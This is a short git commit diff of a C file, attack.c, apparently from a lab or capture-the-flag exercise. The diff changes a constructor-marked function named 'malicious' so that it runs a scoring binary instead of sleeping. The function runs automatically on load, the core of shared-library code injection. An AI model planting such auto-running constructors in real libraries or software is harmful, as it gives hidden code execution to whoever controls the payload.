02f3d820881219f8eaf10e8a1bf1f91061ba943b
root <root@localhost.localdomain>
2021-05-12 00:16:55 -0700

    linux compile

--- attack.c
+++ attack.c
@@ -4,6 +4,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-    //system("/usr/local/bin/score 5f9326bd-6fc1-40f0-a810-b10726da57e7");
-    system("sleep 20");
+    system("/usr/local/bin/score 5f9326bd-6fc1-40f0-a810-b10726da57e7");
 }
